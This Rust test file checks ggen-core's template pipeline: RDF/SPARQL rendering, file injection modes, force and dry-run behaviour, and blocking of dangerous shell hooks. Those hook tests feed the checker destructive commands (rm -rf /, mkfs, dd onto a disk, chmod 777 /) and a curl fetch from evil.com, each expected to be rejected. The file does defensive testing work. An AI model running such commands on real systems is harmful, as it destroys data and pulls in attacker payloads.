//! End-to-end tests for PipelineBuilder, Pipeline, and Plan APIs.
//!
//! These tests exercise the most critical code paths in ggen-core:
//!   - PipelineBuilder construction from TTL strings
//!   - Pipeline rendering of templates with RDF/SPARQL data
//!   - Plan::apply() for file generation and injection
//!   - Dangerous command blocking in shell hooks
//!   - Content injection modes (prepend, append, before-marker, after-marker, at-line)
//!   - Idempotent injection via skip_if patterns
//!   - Force mode vs. non-force mode for file overwriting
//!   - Deterministic output (same input => same output)
//!
//! Tests use the public API only: `PipelineBuilder`, `Pipeline::render_file()`,
//! `Pipeline::render_body()`, and `Plan::apply()`. Private methods like
//! `is_dangerous_command()` and `inject_content()` are tested indirectly
//! through the full pipeline.

use ggen_core::inject::{EolNormalizer, SkipIfGenerator};
use ggen_core::pipeline::{Pipeline, PipelineBuilder};
use std::collections::BTreeMap;
use tempfile::TempDir;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Create a minimal TTL ontology string with a single triple.
fn minimal_ttl() -> &'static str {
    r#"@prefix ex: <http://example.org/> .
ex:hello a ex:Greeting ;
         ex:message "Hello, World!" ."#
}

/// Create a TTL ontology with multiple people for SPARQL tests.
fn people_ttl() -> &'static str {
    r#"@prefix ex: <http://example.org/> .
ex:alice a ex:Person ; ex:name "Alice" ; ex:age 30 .
ex:bob   a ex:Person ; ex:name "Bob"   ; ex:age 25 .
ex:carol a ex:Person ; ex:name "Carol" ; ex:age 35 ."#
}

/// Write a template file to the temp directory and return its path.
fn write_template(temp_dir: &TempDir, name: &str, content: &str) -> std::path::PathBuf {
    let path = temp_dir.path().join(name);
    std::fs::write(&path, content).expect("failed to write template file");
    path
}

/// Write a target file to the temp directory and return its path.
fn write_file(temp_dir: &TempDir, name: &str, content: &str) -> std::path::PathBuf {
    let path = temp_dir.path().join(name);
    std::fs::write(&path, content).expect("failed to write file");
    path
}

/// Create a pipeline builder with standard prefixes pre-configured.
fn builder_with_prefixes() -> PipelineBuilder {
    let mut prefixes = BTreeMap::new();
    prefixes.insert("ex".to_string(), "http://example.org/".to_string());
    PipelineBuilder::new().with_prefixes(prefixes, Some("http://example.org/".to_string()))
}

// ===========================================================================
// Test 1: PipelineBuilder creates pipeline from TTL string
// ===========================================================================

#[test]
fn test_pipeline_builder_creates_pipeline_from_ttl() {
    let pipeline = builder_with_prefixes()
        .with_inline_rdf(vec![minimal_ttl()])
        .build();

    assert!(pipeline.is_ok(), "PipelineBuilder::build() failed: {:?}", pipeline.err());

    let pipeline = pipeline.unwrap();
    // Graph should have loaded triples from the TTL
    assert!(
        pipeline.graph_len() > 0,
        "Graph should contain triples after loading TTL"
    );
}

#[test]
fn test_pipeline_builder_accepts_multiple_inline_rdf_blocks() {
    let ttl_block_1 = r#"@prefix ex: <http://example.org/> . ex:a a ex:Thing ."#;
    let ttl_block_2 = r#"@prefix ex: <http://example.org/> . ex:b a ex:Thing ."#;

    let pipeline = builder_with_prefixes()
        .with_inline_rdf(vec![ttl_block_1, ttl_block_2])
        .build();

    assert!(pipeline.is_ok());
    let pipeline = pipeline.unwrap();
    // Two blocks, each adds at least one triple
    assert!(pipeline.graph_len() >= 2, "Expected at least 2 triples from 2 blocks, got {}", pipeline.graph_len());
}

#[test]
fn test_pipeline_builder_empty_build_succeeds() {
    let pipeline = PipelineBuilder::new().build();
    assert!(pipeline.is_ok(), "Empty PipelineBuilder should succeed: {:?}", pipeline.err());
}

#[test]
fn test_pipeline_builder_with_prefixes_only() {
    let pipeline = builder_with_prefixes().build();
    assert!(pipeline.is_ok(), "Builder with prefixes only should succeed");
}

// ===========================================================================
// Test 2: Pipeline renders a simple template
// ===========================================================================

#[test]
fn test_pipeline_render_simple_template() {
    let temp_dir = TempDir::new().unwrap();
    let template_path = write_template(
        &temp_dir,
        "simple.tmpl",
        r#"---
to: "output.txt"
---
Hello {{ name }}, you are {{ age }} years old."#,
    );

    let mut pipeline = Pipeline::new().unwrap();
    let mut vars = BTreeMap::new();
    vars.insert("name".to_string(), "Alice".to_string());
    vars.insert("age".to_string(), "30".to_string());

    let plan = pipeline
        .render_file(&template_path, &vars, false)
        .expect("render_file should succeed");

    assert_eq!(plan.content(), "Hello Alice, you are 30 years old.");
}

#[test]
fn test_pipeline_render_template_with_sparql() {
    let temp_dir = TempDir::new().unwrap();
    let template_path = write_template(
        &temp_dir,
        "sparql.tmpl",
        r#"---
prefixes:
  ex: "http://example.org/"
rdf_inline:
  - "@prefix ex: <http://example.org/> . ex:alice a ex:Person ; ex:name 'Alice' ."
sparql:
  people: "SELECT ?s WHERE { ?s a ex:Person }"
---
Found {{ sparql_results.people | length }} person(s)."#,
    );

    let mut pipeline = Pipeline::new().unwrap();
    let vars = BTreeMap::new();

    let plan = pipeline
        .render_file(&template_path, &vars, false)
        .expect("render_file with SPARQL should succeed");

    assert!(
        plan.content().contains("Found 1 person"),
        "Expected 'Found 1 person' in output, got: {}",
        plan.content()
    );
}

#[test]
fn test_pipeline_render_body_with_context() {
    let mut pipeline = Pipeline::new().unwrap();
    let mut ctx = tera::Context::new();
    ctx.insert("greeting", "Hola");
    ctx.insert("target", "Mundo");

    let result = pipeline
        .render_body("{{ greeting }}, {{ target }}!", &ctx)
        .expect("render_body should succeed");

    assert_eq!(result, "Hola, Mundo!");
}

#[test]
fn test_pipeline_render_with_inline_rdf_from_builder() {
    let temp_dir = TempDir::new().unwrap();
    let template_path = write_template(
        &temp_dir,
        "rdf.tmpl",
        r#"---
prefixes:
  ex: "http://example.org/"
sparql:
  things: "SELECT ?s WHERE { ?s a ex:Thing }"
---
Count: {{ sparql_results.things | length }}"#,
    );

    let mut pipeline = builder_with_prefixes()
        .with_inline_rdf(vec![
            r#"@prefix ex: <http://example.org/> . ex:thing1 a ex:Thing . ex:thing2 a ex:Thing ."#,
        ])
        .build()
        .unwrap();

    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file with builder RDF should succeed");

    assert!(
        plan.content().contains("Count: 2"),
        "Expected 'Count: 2' in output, got: {}",
        plan.content()
    );
}

// ===========================================================================
// Test 3: is_dangerous_command blocks destructive commands
// (Tested indirectly through Plan::apply with sh_before / sh_after hooks)
// ===========================================================================

/// Helper: build a template that triggers a shell hook on apply.
/// Returns (template_path, output_path).
fn hook_template(temp_dir: &TempDir, hook_field: &str, _hook_value: &str) -> (std::path::PathBuf, std::path::PathBuf) {
    let output_path = temp_dir.path().join("hook_output.txt");
    let template_content = format!(
        r#"---
to: "{}"
{}
---
generated content"#,
        output_path.display(),
        hook_field
    );
    let template_path = write_template(temp_dir, "hook.tmpl", &template_content);
    (template_path, output_path)
}

#[test]
fn test_dangerous_command_rm_rf_blocked() {
    let temp_dir = TempDir::new().unwrap();
    let (template_path, _output_path) =
        hook_template(&temp_dir, "sh_before: \"rm -rf /\"", "");

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    assert!(result.is_err(), "rm -rf / should be blocked");
    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains("SECURITY") || err_msg.contains("dangerous") || err_msg.contains("Blocked"),
        "Error should mention security block, got: {}",
        err_msg
    );
}

#[test]
fn test_dangerous_command_sudo_rm_blocked() {
    let temp_dir = TempDir::new().unwrap();
    let (template_path, _output_path) =
        hook_template(&temp_dir, "sh_before: \"sudo rm -rf /tmp\"", "");

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    assert!(result.is_err(), "sudo rm should be blocked");
}

#[test]
fn test_dangerous_command_mkfs_blocked() {
    let temp_dir = TempDir::new().unwrap();
    let (template_path, _output_path) =
        hook_template(&temp_dir, "sh_after: \"mkfs /dev/sda1\"", "");

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    assert!(result.is_err(), "mkfs should be blocked");
}

#[test]
fn test_dangerous_command_dd_blocked() {
    let temp_dir = TempDir::new().unwrap();
    let (template_path, _output_path) =
        hook_template(&temp_dir, "sh_after: \"dd if=/dev/zero of=/dev/sda\"", "");

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    assert!(result.is_err(), "dd should be blocked");
}

#[test]
fn test_dangerous_command_chmod_root_blocked() {
    let temp_dir = TempDir::new().unwrap();
    let (template_path, _output_path) =
        hook_template(&temp_dir, "sh_before: \"chmod 777 /\"", "");

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    assert!(result.is_err(), "chmod 777 / should be blocked");
}

#[test]
fn test_safe_command_echo_allowed() {
    // NOTE: echo contains no dangerous patterns. However, shell hook execution
    // requires the template to actually write a file (not be in inject mode).
    // The dangerous command check happens before execution, so if echo is safe
    // the command runs. We test that it does NOT produce a SECURITY error.
    let temp_dir = TempDir::new().unwrap();
    let output_path = temp_dir.path().join("echo_output.txt");
    let template_content = format!(
        r#"---
to: "{}"
sh_before: "echo safe"
---
hello"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "echo.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    // echo is NOT in the dangerous patterns list, so it should succeed
    // (or at least not fail with a SECURITY error)
    if let Err(e) = &result {
        let err_msg = e.to_string();
        assert!(
            !err_msg.contains("SECURITY") && !err_msg.contains("dangerous") && !err_msg.contains("Blocked"),
            "echo should not be blocked as dangerous, got: {}",
            err_msg
        );
    }
}

#[test]
fn test_safe_command_cat_local_file_blocked_by_at_pattern() {
    // NOTE: "cat" is actually blocked by the "at " dangerous pattern (substring match).
    // This test documents the false positive: "cat file.txt" contains "at " and is blocked.
    let temp_dir = TempDir::new().unwrap();
    let output_path = temp_dir.path().join("cat_output.txt");
    let template_content = format!(
        r#"---
to: "{}"
sh_after: "cat nonexistent_local.txt"
---
hello"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "cat.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    // "cat" contains "at " substring, so it IS blocked (false positive in the
    // dangerous command checker's substring matching approach)
    assert!(result.is_err(), "cat should be blocked due to 'at ' substring match");
}

#[test]
fn test_safe_command_ls_allowed() {
    // "ls" is not in the dangerous patterns list
    let temp_dir = TempDir::new().unwrap();
    let output_path = temp_dir.path().join("ls_output.txt");
    let template_content = format!(
        r#"---
to: "{}"
sh_before: "ls"
---
hello"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "ls.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    if let Err(e) = &result {
        let err_msg = e.to_string();
        assert!(
            !err_msg.contains("SECURITY") && !err_msg.contains("dangerous"),
            "ls should not be security-blocked, got: {}",
            err_msg
        );
    }
}

// ===========================================================================
// Test 4: Content injection modes
// ===========================================================================

#[test]
fn test_injection_prepend_mode() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "target.txt", "line2\nline3\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
prepend: true
---
injected_line1"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed for injection");

    let result = std::fs::read_to_string(&target_path).unwrap();
    assert!(
        result.starts_with("injected_line1"),
        "Prepended content should be at the start, got: {}",
        result
    );
    assert!(
        result.contains("line2") && result.contains("line3"),
        "Original content should be preserved after prepend"
    );
}

#[test]
fn test_injection_append_mode() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "target.txt", "line1\nline2\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
append: true
---
appended_line3"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed for injection");

    let result = std::fs::read_to_string(&target_path).unwrap();
    assert!(
        result.contains("appended_line3"),
        "Appended content should be present"
    );
    assert!(
        result.starts_with("line1"),
        "Original content should be preserved before append"
    );
}

#[test]
fn test_injection_before_marker_mode() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "target.txt", "line1\n// MARKER\nline3\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
before: "// MARKER"
---
injected_before_marker"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed for injection");

    let result = std::fs::read_to_string(&target_path).unwrap();
    let lines: Vec<&str> = result.lines().collect();
    let marker_idx = lines.iter().position(|l| *l == "// MARKER").expect("MARKER should exist");
    assert!(
        marker_idx > 0,
        "Injected content should come before MARKER"
    );
    assert_eq!(
        lines[marker_idx - 1], "injected_before_marker",
        "Line before MARKER should be the injected content"
    );
}

#[test]
fn test_injection_after_marker_mode() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "target.txt", "line1\n// MARKER\nline3\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
after: "// MARKER"
---
injected_after_marker"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed for injection");

    let result = std::fs::read_to_string(&target_path).unwrap();
    let lines: Vec<&str> = result.lines().collect();
    let marker_idx = lines.iter().position(|l| *l == "// MARKER").expect("MARKER should exist");
    assert!(
        marker_idx + 1 < lines.len(),
        "There should be content after MARKER"
    );
    assert_eq!(
        lines[marker_idx + 1], "injected_after_marker",
        "Line after MARKER should be the injected content"
    );
}

#[test]
fn test_injection_at_line_mode() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "target.txt", "line1\nline2\nline3\nline4\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
at_line: 3
---
inserted_at_line_3"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed for injection");

    let result = std::fs::read_to_string(&target_path).unwrap();
    let lines: Vec<&str> = result.lines().collect();
    // at_line is 1-based, so line 3 means index 2
    assert_eq!(lines[2], "inserted_at_line_3", "Content should be at line 3 (index 2)");
    assert_eq!(lines[0], "line1", "line1 should be at index 0");
    assert_eq!(lines[1], "line2", "line2 should be at index 1");
}

#[test]
fn test_injection_creates_new_file_when_missing() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = temp_dir.path().join("new_file.txt");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
---
brand new file content"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should create new file via injection");

    assert!(target_path.exists(), "New file should be created");
    let result = std::fs::read_to_string(&target_path).unwrap();
    assert_eq!(result, "brand new file content");
}

// ===========================================================================
// Test 5: Skip-if pattern prevents duplicate injection
// ===========================================================================

#[test]
fn test_skip_if_prevents_duplicate_injection() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(
        &temp_dir,
        "existing.txt",
        "original content\nINJECTED_MARKER\nmore content\n",
    );

    // skip_if uses a regex pattern. If it matches, injection is skipped.
    let template_content = format!(
        r#"---
to: "{}"
inject: true
skip_if: "INJECTED_MARKER"
---
DUPLICATE_CONTENT"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed (skip)");

    let result = std::fs::read_to_string(&target_path).unwrap();
    assert!(
        !result.contains("DUPLICATE_CONTENT"),
        "Content should NOT be injected when skip_if pattern matches, got: {}",
        result
    );
    assert!(
        result.contains("original content"),
        "Original content should be preserved"
    );
}

#[test]
fn test_skip_if_allows_injection_when_pattern_missing() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "target.txt", "some content\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
skip_if: "NEVER_PRESENT_MARKER"
---
new_injected_content"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed");

    let result = std::fs::read_to_string(&target_path).unwrap();
    assert!(
        result.contains("new_injected_content"),
        "Content SHOULD be injected when skip_if pattern does not match"
    );
}

#[test]
fn test_idempotent_flag_prevents_duplicate_injection() {
    let temp_dir = TempDir::new().unwrap();
    // The idempotent flag checks if the exact content already exists
    let target_path = write_file(&temp_dir, "existing.txt", "header\nEXACT_CONTENT\nfooter\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
idempotent: true
---
EXACT_CONTENT"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "inject.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed (idempotent skip)");

    let result = std::fs::read_to_string(&target_path).unwrap();
    // Count occurrences of EXACT_CONTENT -- should still be 1, not duplicated
    let count = result.matches("EXACT_CONTENT").count();
    assert_eq!(
        count, 1,
        "Idempotent injection should not duplicate content, found {} occurrences in: {}",
        count, result
    );
}

// ===========================================================================
// Test 6: Force mode vs non-force mode
// ===========================================================================

#[test]
fn test_non_force_mode_refuses_overwrite() {
    let temp_dir = TempDir::new().unwrap();
    let output_path = write_file(&temp_dir, "output.txt", "original content");

    // force defaults to false
    let template_content = format!(
        r#"---
to: "{}"
---
new content"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "overwrite.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    assert!(
        result.is_err(),
        "Non-force mode should refuse to overwrite existing file"
    );
    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains("already exists") || err_msg.contains("force"),
        "Error should mention file exists or force flag, got: {}",
        err_msg
    );

    // Verify original content unchanged
    let content = std::fs::read_to_string(&output_path).unwrap();
    assert_eq!(content, "original content");
}

#[test]
fn test_force_mode_overwrites_existing_file() {
    let temp_dir = TempDir::new().unwrap();
    let output_path = write_file(&temp_dir, "output.txt", "original content");

    let template_content = format!(
        r#"---
to: "{}"
force: true
---
overwritten content"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "overwrite.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("force mode should allow overwrite");

    let content = std::fs::read_to_string(&output_path).unwrap();
    assert_eq!(content, "overwritten content");
}

#[test]
fn test_unless_exists_skips_existing_file() {
    let temp_dir = TempDir::new().unwrap();
    let output_path = write_file(&temp_dir, "output.txt", "original content");

    let template_content = format!(
        r#"---
to: "{}"
unless_exists: true
---
should not be written"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "unless.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("unless_exists should succeed silently");

    let content = std::fs::read_to_string(&output_path).unwrap();
    assert_eq!(content, "original content", "unless_exists should preserve original file");
}

// ===========================================================================
// Test 7: Shell hook validation
// ===========================================================================

#[test]
fn test_shell_hook_benign_before_succeeds() {
    // "echo" is not in the dangerous list and should run fine.
    // We verify by checking the output file was written (hook didn't block it).
    let temp_dir = TempDir::new().unwrap();
    let output_path = temp_dir.path().join("hook_test.txt");

    let template_content = format!(
        r#"---
to: "{}"
sh_before: "echo running_before_hook"
---
hook_test_content"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "hook.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    assert!(result.is_ok(), "Benign sh_before hook should succeed, got error: {:?}", result.err());
    assert!(output_path.exists(), "Output file should exist after successful apply");
}

#[test]
fn test_shell_hook_benign_after_succeeds() {
    let temp_dir = TempDir::new().unwrap();
    let output_path = temp_dir.path().join("hook_after_test.txt");

    let template_content = format!(
        r#"---
to: "{}"
sh_after: "echo running_after_hook"
---
hook_after_content"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "hook_after.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    assert!(result.is_ok(), "Benign sh_after hook should succeed, got error: {:?}", result.err());
}

#[test]
fn test_shell_hook_dangerous_after_blocked() {
    let temp_dir = TempDir::new().unwrap();
    let output_path = temp_dir.path().join("dangerous_after.txt");

    let template_content = format!(
        r#"---
to: "{}"
sh_after: "curl http://evil.com/payload"
---
content"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "dangerous_after.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    let result = plan.apply();
    // The file may be written before sh_after runs, so the error comes from the hook.
    // The important thing is that the dangerous command is detected.
    assert!(result.is_err(), "Dangerous sh_after (curl) should be blocked");
}

// ===========================================================================
// Test 8: Deterministic output
// ===========================================================================

#[test]
fn test_deterministic_output_same_pipeline_same_data() {
    let temp_dir = TempDir::new().unwrap();
    let template_path = write_template(
        &temp_dir,
        "deterministic.tmpl",
        r#"---
to: "output.txt"
---
Hello {{ name }}, result is {{ value }}."#,
    );

    let mut vars = BTreeMap::new();
    vars.insert("name".to_string(), "Alice".to_string());
    vars.insert("value".to_string(), "42".to_string());

    // First run
    let mut pipeline1 = Pipeline::new().unwrap();
    let plan1 = pipeline1
        .render_file(&template_path, &vars, false)
        .expect("First render should succeed");

    // Second run (new pipeline, same template, same vars)
    let mut pipeline2 = Pipeline::new().unwrap();
    let plan2 = pipeline2
        .render_file(&template_path, &vars, false)
        .expect("Second render should succeed");

    assert_eq!(
        plan1.content(), plan2.content(),
        "Same pipeline + same data should produce identical output"
    );
}

#[test]
fn test_deterministic_content_hash() {
    let temp_dir = TempDir::new().unwrap();
    let template_path = write_template(
        &temp_dir,
        "hash.tmpl",
        r#"---
to: "output.txt"
---
deterministic content here"#,
    );

    let mut pipeline1 = Pipeline::new().unwrap();
    let plan1 = pipeline1
        .render_file(&template_path, &BTreeMap::new(), false)
        .unwrap();

    let mut pipeline2 = Pipeline::new().unwrap();
    let plan2 = pipeline2
        .render_file(&template_path, &BTreeMap::new(), false)
        .unwrap();

    assert_eq!(
        plan1.content_hash(),
        plan2.content_hash(),
        "Content hashes should be identical for identical renders"
    );
}

#[test]
fn test_deterministic_with_rdf_data() {
    let temp_dir = TempDir::new().unwrap();
    let template_path = write_template(
        &temp_dir,
        "rdf_det.tmpl",
        r#"---
prefixes:
  ex: "http://example.org/"
rdf_inline:
  - "@prefix ex: <http://example.org/> . ex:alice a ex:Person ; ex:name 'Alice' ."
sparql:
  people: "SELECT ?s WHERE { ?s a ex:Person }"
---
Count: {{ sparql_results.people | length }}"#,
    );

    let mut pipeline1 = Pipeline::new().unwrap();
    let plan1 = pipeline1
        .render_file(&template_path, &BTreeMap::new(), false)
        .unwrap();

    let mut pipeline2 = Pipeline::new().unwrap();
    let plan2 = pipeline2
        .render_file(&template_path, &BTreeMap::new(), false)
        .unwrap();

    assert_eq!(plan1.content(), plan2.content(), "RDF-rendered output should be deterministic");
}

// ===========================================================================
// Test 9: Dry run mode
// ===========================================================================

#[test]
fn test_dry_run_does_not_write_file() {
    let temp_dir = TempDir::new().unwrap();
    let output_path = temp_dir.path().join("dry_run_output.txt");

    let template_content = format!(
        r#"---
to: "{}"
---
dry run content"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "dry.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), true) // dry_run = true
        .expect("render_file should succeed");

    plan.apply().expect("dry run apply should succeed");

    assert!(
        !output_path.exists(),
        "Dry run should NOT create the output file"
    );
}

// ===========================================================================
// Test 10: EolNormalizer and SkipIfGenerator (from inject module)
// ===========================================================================

#[test]
fn test_eol_normalizer_detect_crlf() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = write_file(&temp_dir, "crlf.txt", "line1\r\nline2\r\n");

    let eol = EolNormalizer::detect_eol(&file_path).unwrap();
    assert_eq!(eol, "\r\n");
}

#[test]
fn test_eol_normalizer_detect_lf() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = write_file(&temp_dir, "lf.txt", "line1\nline2\n");

    let eol = EolNormalizer::detect_eol(&file_path).unwrap();
    assert_eq!(eol, "\n");
}

#[test]
fn test_eol_normalizer_normalize_to_eol() {
    let mixed = "line1\r\nline2\rline3\nline4";
    let normalized = EolNormalizer::normalize_to_eol(mixed, "\n");
    assert_eq!(normalized, "line1\nline2\nline3\nline4");
}

#[test]
fn test_eol_normalizer_normalize_to_match_file() {
    let temp_dir = TempDir::new().unwrap();
    let target = write_file(&temp_dir, "target.txt", "existing\r\ncontent");

    let input = "new\nlines";
    let normalized = EolNormalizer::normalize_to_match_file(input, &target).unwrap();
    assert_eq!(normalized, "new\r\nlines");
}

#[test]
fn test_skip_if_generator_exact_match() {
    let content = "fn main() { println!(\"hello\"); }";
    let pattern = SkipIfGenerator::generate_exact_match(content);

    // Should be a valid regex
    let regex = regex::Regex::new(&pattern).expect("pattern should be valid regex");
    assert!(regex.is_match(content), "Pattern should match the original content");

    // Should NOT match different content
    let different = "fn main() { println!(\"goodbye\"); }";
    assert!(!regex.is_match(different), "Pattern should not match different content");
}

#[test]
fn test_skip_if_generator_with_special_chars() {
    let content = "regex: /[a-z]+\\s*/g";
    let pattern = SkipIfGenerator::generate_exact_match(content);
    let regex = regex::Regex::new(&pattern).expect("pattern with special chars should be valid");
    assert!(regex.is_match(content));
}

#[test]
fn test_content_exists_in_file_true() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = write_file(&temp_dir, "check.txt", "header\nneedle content\nfooter");

    assert!(
        SkipIfGenerator::content_exists_in_file("needle content", &file_path).unwrap(),
        "Should find existing content"
    );
}

#[test]
fn test_content_exists_in_file_false() {
    let temp_dir = TempDir::new().unwrap();
    let file_path = write_file(&temp_dir, "check.txt", "header\nfooter");

    assert!(
        !SkipIfGenerator::content_exists_in_file("needle content", &file_path).unwrap(),
        "Should NOT find missing content"
    );
}

#[test]
fn test_content_exists_in_nonexistent_file() {
    assert!(
        !SkipIfGenerator::content_exists_in_file("anything", std::path::Path::new("/nonexistent/file"))
            .unwrap(),
        "Nonexistent file should return false"
    );
}

// ===========================================================================
// Test 11: PipelineBuilder with RDF files (requires temp files)
// ===========================================================================

#[test]
fn test_pipeline_builder_with_rdf_file() {
    let temp_dir = TempDir::new().unwrap();
    let rdf_path = write_file(&temp_dir, "data.ttl", people_ttl());

    let pipeline = builder_with_prefixes()
        .with_rdf_file(rdf_path.to_str().unwrap())
        .build();

    assert!(pipeline.is_ok(), "Builder with RDF file should succeed: {:?}", pipeline.err());
    let pipeline = pipeline.unwrap();
    assert!(
        pipeline.graph_len() >= 3,
        "Graph should have at least 3 triples from people TTL, got {}",
        pipeline.graph_len()
    );
}

#[test]
fn test_pipeline_builder_with_multiple_rdf_files() {
    let temp_dir = TempDir::new().unwrap();
    let rdf1 = write_file(
        &temp_dir,
        "data1.ttl",
        r#"@prefix ex: <http://example.org/> . ex:item1 a ex:Item ."#,
    );
    let rdf2 = write_file(
        &temp_dir,
        "data2.ttl",
        r#"@prefix ex: <http://example.org/> . ex:item2 a ex:Item ."#,
    );

    let pipeline = builder_with_prefixes()
        .with_rdf_files(vec![rdf1.to_str().unwrap(), rdf2.to_str().unwrap()])
        .build();

    assert!(pipeline.is_ok());
    let pipeline = pipeline.unwrap();
    assert!(
        pipeline.graph_len() >= 2,
        "Graph should have triples from both files"
    );
}

// ===========================================================================
// Test 12: E2E - full pipeline from TTL through SPARQL to rendered output
